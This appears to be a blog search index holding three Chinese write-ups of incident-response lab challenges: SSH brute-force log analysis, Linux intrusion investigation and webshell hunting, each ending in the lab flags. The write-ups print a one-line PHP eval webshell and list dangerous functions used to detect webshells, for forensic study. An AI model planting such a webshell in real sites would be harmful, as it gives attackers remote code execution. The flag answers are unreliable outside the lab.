<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2024/11/26/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/26/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="玄机——第一章-应急响应-Linux日志分析"><a href="#玄机——第一章-应急响应-Linux日志分析" class="headerlink" title="玄机——第一章 应急响应-Linux日志分析"></a>玄机——第一章 应急响应-Linux日志分析</h2><h3 id="1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h3><p>首先肯定是先找到日志的位置，一般来说，SSH登录尝试会记录在 <strong>&#x2F;var&#x2F;log&#x2F;auth.log.1</strong></p><ul><li><strong>使用grep筛选出SSH失败的登录尝试</strong>： 我们需要筛选出涉及到root帐号的SSH失败登录尝试的日志条目。</li></ul><p>最后；</p><ul><li><strong>提取IP地址</strong>： 从这些日志条目中提取尝试登录的IP地址。</li><li><strong>统计各个IP地址的尝试次数</strong>： 统计每个IP地址的尝试次数，找出所有尝试暴力破解的IP。</li></ul><p>逻辑基本就是上面这样，如果日志少一些那还好，可以一条条进行分析，日志多的话那可能还要进行筛选</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><ul><li>从 <code>auth.log.1</code> 文件中筛选出所有尝试登录root用户失败的条目。</li><li>提取这些条目中的IP地址（假设IP地址是日志行中的第11个字段）。</li><li>对IP地址进行排序和去重，并统计每个IP地址的尝试次数。</li><li>将结果按尝试次数降序排序，并分页显示。</li></ul><p>flag{192.168.200.2,192.168.200.31,192.168.200.32}</p><p><img src="C:\Users\30938\AppData\Roaming\Typora\typora-user-images\image-20241123230256267.png" alt="image-20241123230256267"></p><h3 id="2-ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割"><a href="#2-ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割" class="headerlink" title="2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>2.ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1 | grep -a &quot;Accepted &quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><p><strong>简单来说就是分析<code>auth.log.1</code>日志文件，提取出所有包含”Accepted “字符串的行（登录成功），然后使用<code>awk</code>命令提取每行的第11个字段（通常这个字段表示远程IP地址），之后对这些IP地址进行降序排序和统计，最后按照数量的降序排列，并通过<code>more</code>命令分页显示结果。</strong></p><p>flag{192.168.200.2}</p><p><img src="C:\Users\30938\AppData\Roaming\Typora\typora-user-images\image-20241123230320861.png" alt="image-20241123230320861"></p><h3 id="3-爆破用户名字典是什么？如果有多个使用”-”分割"><a href="#3-爆破用户名字典是什么？如果有多个使用”-”分割" class="headerlink" title="3.爆破用户名字典是什么？如果有多个使用”,”分割"></a>3.爆破用户名字典是什么？如果有多个使用”,”分割</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1 | grep -a &quot;Failed password&quot; |perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br></pre></td></tr></table></figure><p>这个命令链的主要作用是分析<code>auth.log.1</code>文件，提取出所有包含”Failed password”字符串的行，这通常表明有失败的登录尝试。然后，它使用Perl脚本提取出失败尝试的用户名和来源IP地址，统计每个用户名的失败尝试次数，并按照次数降序排列显示结果。</p><p>perl -e ‘while($_&#x3D;&lt;&gt;){ &#x2F;for(.*?) from&#x2F;; print “$1\n”;}’:</p><ul><li><p>作用：使用Perl脚本从每一行提取出失败登录尝试的用户名。</p></li><li><p>while($_&#x3D;&lt;&gt;)：逐行读取输入。</p></li><li><p>&#x2F;for(.*?) from&#x2F;：使用正则表达式匹配模式“for [username] from”，其中[username]是登录尝试的用户名。</p></li><li><p>print “$1\n”：将提取的用户名打印出来。</p></li></ul><p>uniq -c:</p><ul><li>作用：对提取出的用户名进行去重并计数。每个唯一的用户名会与其出现的次数一起输出。</li><li>-c选项：在每个唯一项的前面显示出现次数。</li></ul><p><img src="C:\Users\30938\AppData\Roaming\Typora\typora-user-images\image-20241123230450681.png" alt="image-20241123230450681"></p><p>flag{user,hello,root,test3,test2,test1}</p><h3 id="4-登陆成功的IP共爆破了多少次"><a href="#4-登陆成功的IP共爆破了多少次" class="headerlink" title="4.登陆成功的IP共爆破了多少次"></a>4.<strong>登陆成功</strong>的IP共<strong>爆破</strong>了多少次</h3><p><strong>这个就更简单了，其实也和上面第一题重复了，因为问题问：有多少IP在爆破主机ssh的root账号？这里又问成功登录 root 用户的 ip 一共爆破了多少次？而且前面我们在统计IP的时候就已经顺便把次数统计出来了，所以PASS，这里没什么好说的；</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><p><img src="C:\Users\30938\AppData\Roaming\Typora\typora-user-images\image-20241120113132180.png" alt="image-20241120113132180"></p><p>flag{4}</p><h3 id="5-黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#5-黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="5.黑客登陆主机后新建了一个后门用户，用户名是多少"></a>5.黑客登陆主机后<strong>新建</strong>了一个后门用户，用户名是多少</h3><p><strong>步骤一</strong>：确定日志文件</p><p>通常与用户登录和用户管理活动相关的日志文件是 <code>/var/log/auth.log</code> 或其备份文件如 <code>/var/log/auth.log.1</code></p><p><strong>步骤2</strong>：搜索创建用户的关键字</p><p>cat &#x2F;var&#x2F;log&#x2F;auth.log.1 | grep -a “new user”</p><p><strong>步骤3</strong>：提取新用户信息</p><p>从日志中提取新用户的详细信息，包括用户名、创建时间等。</p><p>例如，假设你得到了如下输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jan 12 10:32:15 server useradd[1234]: new user: name=testuser, UID=1001, GID=1001, home=/home/testuser, shell=/bin/bash</span><br></pre></td></tr></table></figure><p>这条日志显示了创建的新用户 testuser。<br><strong>步骤4</strong>：分析执行上下文</p><p>确认新用户的创建是否由合法用户执行，或是否有可疑的远程登录记录。</p><p>可以使用以下命令查找所有用户登录的情况，以确定是否有可疑的登录行为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;Accepted&quot; /var/log/auth.log.1</span><br></pre></td></tr></table></figure><p><strong>对于本题</strong></p><p>直接登&#x2F;etc&#x2F;passwd看，发现是test2，直接找也可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat auth.log.1|grep -a &quot;new user&quot;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="C:\Users\30938\AppData\Roaming\Typora\typora-user-images\image-20241123230608549.png" alt="image-20241123230608549"></p><p>flag就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;test2&#125;</span><br></pre></td></tr></table></figure><h3 id="常见日志文件"><a href="#常见日志文件" class="headerlink" title="常见日志文件"></a><strong>常见日志文件</strong></h3><p>Linux系统中的日志文件通常存储在 <code>/var/log</code> 目录下，常见的日志文件包括：</p><p>&#x2F;var&#x2F;log&#x2F;syslog：记录系统的各种信息和错误。<br>&#x2F;var&#x2F;log&#x2F;auth.log：记录身份验证相关的信息，如登录和认证失败。<br>&#x2F;var&#x2F;log&#x2F;kern.log：记录内核生成的日志信息。<br>&#x2F;var&#x2F;log&#x2F;dmesg：记录系统启动时内核产生的消息。<br>&#x2F;var&#x2F;log&#x2F;boot.log：记录系统启动过程中的消息。<br>&#x2F;var&#x2F;log&#x2F;messages：记录系统的广泛消息，包括启动和应用程序信息。<br>&#x2F;var&#x2F;log&#x2F;secure：记录安全相关的消息。<br>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;：记录Apache HTTP服务器的访问和错误日志（若安装了Apache）。<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;：记录Nginx服务器的访问和错误日志（若安装了Nginx）。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/11/26/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%20Linux/"/>
      <url>/2024/11/26/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%20Linux/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章-应急响应-Linux入侵排查"><a href="#第一章-应急响应-Linux入侵排查" class="headerlink" title="第一章 应急响应- Linux入侵排查"></a>第一章 应急响应- Linux入侵排查</h2><p>到&#x2F;var&#x2F;www把html目录dump下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf html.tar.gz ./</span><br></pre></td></tr></table></figure><h3 id="1-web目录存在木马，请找到木马的密码提交"><a href="#1-web目录存在木马，请找到木马的密码提交" class="headerlink" title="1.web目录存在木马，请找到木马的密码提交"></a>1.web目录存在木马，请找到木马的密码提交</h3><p>使用河马</p><p><img src="C:\Users\30938\AppData\Roaming\Typora\typora-user-images\image-20241123232018965.png" alt="image-20241123232018965"></p><p>1.php中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>flag{1}</p><h3 id="2-服务器疑似存在不死马，请找到不死马的密码提交"><a href="#2-服务器疑似存在不死马，请找到不死马的密码提交" class="headerlink" title="2.服务器疑似存在不死马，请找到不死马的密码提交"></a>2.服务器疑似存在不死马，请找到不死马的密码提交</h3><p>index.php观察到不死马</p><p><img src="C:\Users\30938\AppData\Roaming\Typora\typora-user-images\image-20241123232141400.png" alt="image-20241123232141400"></p><p>5d41402abc4b2a76b9719d911017c592是helloMD5加密后的结果</p><p>flag{hello}</p><h3 id="3-不死马是通过哪个文件生成的，请提交文件名"><a href="#3-不死马是通过哪个文件生成的，请提交文件名" class="headerlink" title="3.不死马是通过哪个文件生成的，请提交文件名"></a>3.不死马是通过哪个文件生成的，请提交文件名</h3><p>flag{index.php}</p><h3 id="4-黑客留下了木马文件，请找出黑客的服务器ip提交"><a href="#4-黑客留下了木马文件，请找出黑客的服务器ip提交" class="headerlink" title="4.黑客留下了木马文件，请找出黑客的服务器ip提交"></a>4.黑客留下了木马文件，请找出黑客的服务器ip提交</h3><p>关键点在shell.elf</p><p>在虚拟机上跑一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:/var/www/html# chmod +x shell\(1\).elf </span><br><span class="line">root@ip-10-0-10-1:/var/www/html# ./shell\(1\).elf &amp;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\30938\AppData\Roaming\Typora\typora-user-images\image-20241124000248932.png" alt="image-20241124000248932"></p><h3 id="5-黑客留下了木马文件，请找出黑客服务器开启的监端口提交"><a href="#5-黑客留下了木马文件，请找出黑客服务器开启的监端口提交" class="headerlink" title="5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交"></a>5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</h3><ul><li><p>步骤4了解后，那么端口号也知道了</p><p>flag{3333}</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>玄机--第一章--webshell查杀</title>
      <link href="/2024/11/13/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0webshell%E6%9F%A5%E6%9D%80/"/>
      <url>/2024/11/13/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0webshell%E6%9F%A5%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="玄机-第一章-应急响应"><a href="#玄机-第一章-应急响应" class="headerlink" title="[玄机]第一章 应急响应"></a>[玄机]第一章 应急响应</h1><h1 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h1><p>#我这里使用Tabby Terminal进行远程连接</p><h2 id="1-黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><a href="#1-黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx" class="headerlink" title="1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}"></a>1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</h2><p>分析webshell可以利用在线工具 也可以手敲命令</p><h3 id="①-在线工具-我这里用的有D盾和微步云沙箱-https-s-threatbook-com"><a href="#①-在线工具-我这里用的有D盾和微步云沙箱-https-s-threatbook-com" class="headerlink" title="①.在线工具 我这里用的有D盾和微步云沙箱(https://s.threatbook.com/)"></a><strong>①.在线工具 我这里用的有D盾和微步云沙箱(<a href="https://s.threatbook.com/">https://s.threatbook.com/</a>)</strong></h3><p>Tabby连接后直接把 var&#x2F;www&#x2F;html 下的全部文件拉出来</p><p>或者</p><p>使用命令</p><p>scp -r root@ip:&#x2F;var&#x2F;www&#x2F;html ~&#x2F;桌面&#x2F;yingji</p><p>放入网页分析即可</p><h3 id="②-列出几个常用的分析命令"><a href="#②-列出几个常用的分析命令" class="headerlink" title="②.列出几个常用的分析命令"></a><strong>②.列出几个常用的分析命令</strong></h3><p>find .&#x2F; type f -name “<em>.jsp” | xargs grep “exec(“<br>find .&#x2F; type f -name “</em>.php” | xargs grep “eval(“<br>find .&#x2F; type f -name “<em>.asp” | xargs grep “execute(“<br>find .&#x2F; type f -name “</em>.aspx” | xargs grep “eval(“ </p><p><code>find ./ -type f</code> 就是查找当前目录及其子目录中的所有普通文件（即不是目录、设备文件等）</p><p><code>xargs</code> 的作用是接收 <code>find</code> 命令返回的文件路径列表，并将它们传递给 <code>grep</code> 命令进行处理</p><p><code>| xargs grep &quot;eval(&quot;</code>：将查找到的每个 <code>.php</code> 文件传递给 <code>grep</code> 命令，查找文件中是否包含 <code>eval(</code> 关键字</p><p>这里用find .&#x2F; type f -name “*.php” | xargs grep “eval(“ </p><p>可以看到三个文件</p><h2 id="2-黑客使用的什么工具的shell-github地址的md5-flag-md5"><a href="#2-黑客使用的什么工具的shell-github地址的md5-flag-md5" class="headerlink" title="2.黑客使用的什么工具的shell github地址的md5 flag{md5}"></a>2.黑客使用的什么工具的shell github地址的md5 flag{md5}</h2><p>查看gz.php的代码特征</p><p>明显的哥斯拉特征  <a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a> </p><p>再MD5加密即可</p><h2 id="3-黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx"><a href="#3-黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx" class="headerlink" title="3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx"></a>3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</h2><p>既然说是隐藏了 </p><p>这里要用ls -al才能看到文件名</p><p>在include&#x2F;Db 目录下找到隐藏的文件</p><p>root@ip-10-0-10-3:&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db# ls -la<br>total 36<br>drwxr-xr-x 2 www-data www-data 4096 Aug  2  2023 .<br>drwxr-xr-x 4 www-data www-data 4096 Aug  2  2023 ..<br>-rw-r–r– 1 www-data www-data  768 Aug  2  2023 .Mysqli.php<br>-rwxr-xr-x 1 www-data www-data 4752 Mar 14  2021 Mysqli.php<br>-rwxr-xr-x 1 www-data www-data 4921 Mar 14  2021 Mysql.php<br>-rwxr-xr-x 1 www-data www-data 4433 Mar 14  2021 Sqlite.php</p><p>pwd查看当前目录</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;include&#x2F;Db&#x2F;.Mysqli.php</p><p>md5加密即可</p><h2 id="4-黑客免杀马完整路径-md5-flag-md5"><a href="#4-黑客免杀马完整路径-md5-flag-md5" class="headerlink" title="4.黑客免杀马完整路径 md5 flag{md5}"></a>4.黑客免杀马完整路径 md5 flag{md5}</h2><p>免杀马 我们正常扫描扫不到</p><p>这种情况我们就要访问日志 在日志中看是否有可疑的地方</p><p>cd var&#x2F;log<br>cd apache2<br>cat access.log</p><p>目录：&#x2F;wap&#x2F;top.php</p><p>完整路径为：&#x2F;var&#x2F;www&#x2F;html&#x2F;wap&#x2F;top.php</p><h2 id="websehll代码特征"><a href="#websehll代码特征" class="headerlink" title="websehll代码特征"></a>websehll代码特征</h2><h3 id="1-php危险函数"><a href="#1-php危险函数" class="headerlink" title="1.php危险函数"></a>1.php危险函数</h3><p>eval() system() exec() shell_exec() passthru() （命令执行）</p><p>fopen() fwrite() file_get_contents() file_put_contents()  （文件操作）</p><p>fsockopen() curl_exec() file_get_contents(‘http:&#x2F;&#x2F;…’) （网络操作）</p><h3 id="2-ASP-JSP"><a href="#2-ASP-JSP" class="headerlink" title="2.ASP,JSP"></a>2.ASP,JSP</h3><p> ASP：Execute() Eval() CreateObject()  （命令执行）</p><p>JSP：Runtime.getRuntime().exec()  （命令执行）</p><p>ASP：FileSystemObject() （文件操作）</p><p>ASP：WinHttp.WinHttpRequest  （网络操作）</p><h3 id="3-编码和解码"><a href="#3-编码和解码" class="headerlink" title="3.编码和解码"></a>3.编码和解码</h3><p>常见的编解码函数</p><h2 id="常见网站日志的命令（默认路径）"><a href="#常见网站日志的命令（默认路径）" class="headerlink" title="常见网站日志的命令（默认路径）"></a>常见网站日志的命令（默认路径）</h2><h3 id="一-IIS-windows默认服务器"><a href="#一-IIS-windows默认服务器" class="headerlink" title="一.IIS(windows默认服务器)"></a>一.IIS(windows默认服务器)</h3><p>IIS6.0及更早版本：</p><p>C:\WINDOWS\system32\LogFiles\W3SVC[SiteID]\</p><p>IIS7.0及更高版本：</p><p>C:\inetpub\logs\LogFiles\W3SVC[SiteID]\</p><h3 id="二-Apache-Windows"><a href="#二-Apache-Windows" class="headerlink" title="二.Apache(Windows)"></a>二.Apache(Windows)</h3><p>如果在Windows上安装了Apache，日志文件默认存储在安装目录下的logs文件夹中：</p><p>C:\Program Files (x86)\Apache Group\Apache2\logs\</p><p>or</p><p>C:\Program Files\Apache Group\Apache2\logs\</p><h3 id="三-Apache-Linux"><a href="#三-Apache-Linux" class="headerlink" title="三.Apache(Linux)"></a>三.Apache(Linux)</h3><p>正常访问日志：</p><p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log    或者    &#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</p><p>错误日志：</p><p>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log    或者    &#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log</p><p>在Debian&#x2F;Ubuntu上通常使用&#x2F;var&#x2F;log&#x2F;apache2&#x2F;，而在Red Hat&#x2F;CentOS上通常使用&#x2F;var&#x2F;log&#x2F;httpd&#x2F;</p><h3 id="四-Nginx"><a href="#四-Nginx" class="headerlink" title="四.Nginx"></a>四.Nginx</h3><p>正常访问日志：</p><p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>错误日志：</p><p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>]]></content>
      
      
      <categories>
          
          <category> -应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -玄机 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
